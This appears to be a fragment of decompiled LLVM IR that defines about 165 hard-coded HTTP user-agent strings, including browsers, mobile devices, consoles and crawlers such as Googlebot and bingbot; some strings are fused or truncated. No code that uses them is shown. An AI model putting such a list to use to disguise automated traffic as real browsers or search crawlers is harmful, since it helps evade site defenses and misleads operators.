@global_var_1e8c8.662 = constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00"
@global_var_1e93c.663 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00"
@global_var_1e984.664 = constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00"
@global_var_1e9fc.665 = constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00"
@global_var_1ea30.666 = constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00"
@global_var_1ea54.667 = constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00"
@global_var_1eadc.668 = constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00"
@global_var_1eb4c.669 = constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00"
@global_var_1ebc4.670 = constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00"
@global_var_1ebf8.671 = constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00"
@global_var_1ec98.672 = constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00"
@global_var_1ed0c.673 = constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_1ed64.674 = constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00"
@global_var_1edbc.675 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1edfc.676 = constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00"
@global_var_1ee64.677 = constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00"
@global_var_1ee98.678 = constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00"
@global_var_1eec8.679 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00"
@global_var_1ef3c.680 = constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00"
@global_var_1efa8.681 = constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00"
@global_var_1f004.682 = constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00"
@global_var_1f06c.683 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_1f0b8.684 = constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_1f10c.685 = constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00"
@global_var_1f174.686 = constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00"
@global_var_1f1c0.687 = constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_1f244.688 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_1f288.689 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_1f2cc.690 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_1f310.691 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_1f354.692 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_1f398.693 = constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00"
@global_var_1f3cc.694 = constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00"
@global_var_1f40c.695 = constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00"
@global_var_1f48c.696 = constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00"
@global_var_1f4f8.697 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1f53c.698 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1f5ac.699 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_1f620.700 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1f66c.701 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_1f6f4.702 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_1f740.703 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_1f7b0.704 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_1f820.705 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_1f894.706 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_1f90c.707 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1f954.708 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1f9cc.709 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_1fa3c.710 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_1faac.711 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_1fb40.712 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_1fb88.713 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_1fbd0.714 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_1fc4c.715 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_1fcc8.716 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_1fd1c.717 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_1fd70.718 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_1fdc4.719 = constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_1fe5c.720 = constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1ff14.721 = constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_1ffb4.722 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_20020.723 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_20090.724 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_20108.725 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_2014c.726 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_201c4.727 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_20208.728 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_2026c.729 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_202b4.730 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_20308.731 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_20380.732 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_203e8.733 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_20434.734 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_20498.735 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_20500.736 = constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00"
@global_var_2058c.737 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_205e0.738 = constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_2066c.739 = constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00"
@global_var_206c8.740 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_20714.741 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_2078c.742 = constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00"
@global_var_207e4.743 = constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_20864.744 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00"
@global_var_208d0.745 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_20948.746 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00"
@global_var_20994.747 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00"
@global_var_20a04.748 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00"
@global_var_20a48.749 = constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_20a88.750 = constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00"
@global_var_20acc.751 = constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00"
@global_var_20b10.752 = constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00"
@global_var_20b58.753 = constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00"
@global_var_20bd8.754 = constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00"
@global_var_20c2c.755 = constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_20cbc.756 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_20d20.757 = constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_20d70.758 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_20ddc.759 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00"
@global_var_20e28.760 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_20ea0.761 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_20ee4.762 = constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00"
@global_var_20f18.763 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_20f5c.764 = constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00"
@global_var_20fd8.765 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_21028.766 = constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00"
@global_var_21060.767 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00"
@global_var_210d8.768 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_2111c.769 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00"
@global_var_2115c.770 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00"
@global_var_2119c.771 = constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00"
@global_var_21228.772 = constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00"
@global_var_21254.773 = constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00"
@global_var_21290.774 = constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00"
@global_var_212c0.775 = constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00"
@global_var_2130c.776 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00"
@global_var_2134c.777 = constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00"
@global_var_2139c.778 = constant [19 x i8] c"C4PC UserAgent/0.7\00"
@global_var_213b0.779 = constant [19 x i8] c"Googlebot 1.01.003\00"
@global_var_213c4.780 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00"
@global_var_21410.781 = constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00"
@global_var_21478.782 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00"
@global_var_214cc.783 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_21518.784 = constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_215d0.785 = constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00"
@global_var_2167c.786 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_216d0.787 = constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00"
@global_var_21794.788 = constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00"
@global_var_21830.789 = constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00"
@global_var_218a0.790 = constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00"
@global_var_218fc.791 = constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00"
@global_var_21950.792 = constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00"
@global_var_219c8.793 = constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00"
@global_var_21a24.794 = constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00"
@global_var_21a88.795 = constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00"
@global_var_21ae8.796 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00"
@global_var_21b40.797 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00"
@global_var_21b84.798 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00"
@global_var_21bd4.799 = constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00"
@global_var_21c58.800 = constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00"
@global_var_21cac.801 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00"
@global_var_21d1c.802 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00"
@global_var_21db4.803 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00"
@global_var_21e00.804 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00"
@global_var_21e80.805 = constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00"
@global_var_21f00.806 = constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00"
@global_var_21f80.807 = constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00"
@global_var_22000.808 = constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00"
@global_var_22080.809 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00"
@global_var_22100.810 = constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00"
@global_var_22178.811 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_221e4.812 = constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00"
@global_var_22258.813 = constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00"
@global_var_222d8.814 = constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00"
@global_var_22314.815 = constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00"
@global_var_2235c.816 = constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00"
@global_var_223a0.817 = constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00"
@global_var_22470.818 = constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00"
@global_var_224cc.819 = constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00"
@global_var_22538.820 = constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00"
@global_var_22580.821 = constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00"
@global_var_22608.822 = constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00"
@global_var_22654.823 = constant [22 x i8] c"Wget/1.12 (linux-gnu)\00"
@global_var_2266c.824 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_226e0.825 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_22754.826 = constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00"
